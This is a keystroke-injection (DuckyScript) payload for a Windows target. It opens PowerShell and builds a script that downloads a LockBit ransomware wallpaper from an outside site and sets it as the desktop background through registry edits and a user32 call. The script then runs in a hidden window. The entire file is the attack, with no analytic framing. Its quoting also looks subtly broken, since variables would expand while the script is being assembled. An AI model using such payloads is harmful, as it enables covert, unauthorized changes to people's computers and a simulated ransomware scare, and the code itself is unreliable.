REM Open PowerShell
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 500

REM Build script line by line
STRING $s = "$imageUrl = 'https://cyble.com/wp-content/uploads/2021/08/Cyble-LOCKBIT-Ransomware-Windows-darkweb-LOCKBIT-2.0-Changing-Desktop-Background.png';"
ENTER
STRING $s += "$username = $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]);"
ENTER
STRING $s += "$imagePath = \"C:\Users\$username\Pictures\downloaded_image.jpg\";"
ENTER
STRING $s += "Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath;"
ENTER
STRING $s += "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Wallpapers' -Name BackgroundType -Value 1;"
ENTER
STRING $s += "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'Wallpaper' -Value $imagePath;"
ENTER
STRING $s += "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'WallpaperStyle' -Value 2;"
ENTER
STRING $s += "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'TileWallpaper' -Value 0;"
ENTER
STRING $s += 'Add-Type -TypeDefinition @"'
ENTER
STRING $s += 'using System;'
ENTER
STRING $s += 'using System.Runtime.InteropServices;'
ENTER
STRING $s += 'public class Wallpaper {'
ENTER
STRING $s += '    [DllImport("user32.dll", CharSet = CharSet.Auto)]'
ENTER
STRING $s += '    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);'
ENTER
STRING $s += '}'
ENTER
STRING $s += '"@;'
ENTER
STRING $s += '[Wallpaper]::SystemParametersInfo(20, 0, $imagePath, 0x01 -bor 0x02);'
ENTER

REM Write it to a temp script and run hidden
STRING $f = "$env:TEMP\w.ps1"; Set-Content $f $s; Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$f`""
ENTER
